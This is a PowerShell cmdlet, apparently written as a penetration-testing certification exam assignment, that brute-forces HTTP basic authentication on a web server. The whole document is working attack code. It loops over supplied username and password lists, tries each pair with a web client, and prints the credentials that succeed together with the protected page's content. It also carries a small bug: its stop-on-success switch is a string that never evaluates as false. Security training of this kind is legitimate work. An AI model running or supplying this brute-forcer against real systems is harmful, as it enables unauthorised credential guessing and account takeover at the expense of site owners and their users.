## Powershell For Penetration Testers Exam Assignment #1 - Brute Force Basic Authentication.

function BF-Basic-Auth
{

<#

.SYNOPSIS
PowerShell cmdlet for brute forcing basic authentication on web site.

.DESCRIPTION
This script is able to connect to a website server and attempt to login using a list of usernames and passwords

.PARAMETER Hostname
The hostname or IP address to connect to when using the -Hostname switch.

.PARAMETER Port
The port the webserver is running on to brute. Default is 80, can change it with the -Port switch.

.PARAMETER UsernameList
The list of usernames (can be a .txt file) to use in the brute force

.PARAMETER PasswordList
The list of passwords (can be a .txt file) to use in the brute force

.PARAMETER StopOnSuccess
Use this switch to stop the brute on the first successful auth

.PARAMETER Protocol
The protocol to bruteforce basic auth against, default is http

.PARAMETER File
The file on the target server that the bruteforce attempts to authenticat against (ex: login.php)

.EXAMPLE
PS C:\> BF-Basic-Auth -Hostname www.YourWebsiteDomainName.com -Port 80

.example
PS C:\> BF-Basic-Auth -Hostname www.YourWebsiteDomainName.com -File login.php

.LINK
https://github.com/little7dragon/PSP/blob/master/BF-Basic-Auth.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3127


#>

	[CmdletBinding()] Param(
	
		[Parameter(Mandatory = $true, ValueFromPipeline=$true)]
		[Alias("host", "IP")]
		[String] $Hostname,
		
		[Parameter(Mandatory = $true)]
		[String] $UsernameList,
		
		[Parameter(Mandatory = $true)]
		[String] $PasswordList,
		
		[Parameter(Mandatory = $false)]
		[String] $Port = "80",
		
		[Parameter(Mandatory = $false)]
		[String] $StopOnSuccess = "True",
		
		[Parameter(Mandatory = $false)]
		[String] $Protocol = "http",

		[Parameter(Mandatory = $false)]
		[String] $File = ""
	
	)
	
	$url = $Protocol + "://" + $Hostname + ":" + $Port + "/" + $File
	
	
	# Read in lists for usernames and passwords 
	$Usernames = Get-Content $UsernameList
	$Passwords = Get-Content $PasswordList
	
	# Does a depth first loop over usernames first, trying every password for each username sequentially in the list
	:UNLoop foreach ($Username in $Usernames)
	{
		# Loops through passwords in the list sequentially 
		foreach ($Password in $Passwords)
    		{
			# Starts a new web client
      		$WebClient = New-Object Net.WebClient
			# Sets basic auth credentials for web client
			$SecurePassword = ConvertTo-SecureString -AsPlainText -String $Password -Force
			$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
			$WebClient.Credentials = $Credential
			Try
			{
				# Show the target
				$url
				# Show the credentials being tested
				$message = "Now checking $Username : $Password"
				$message
				$content = $webClient.DownloadString($url)
				# Continues on to print succesful credentials
				$success = $true
				#$success
				if ($success -eq $true)
				{
					# Show succesful auths 
					$message = "Bingo! $Username : $Password"
					$message
					$content
					if ($StopOnSuccess)
					{
						break UNLoop
					}
				}
			}
			Catch
			{
				# Show any Error messages
				$success = $false
				$message = $error[0].ToString()
				$message
			}
		}
	}
}
Write-Host "[*] Completed.`n"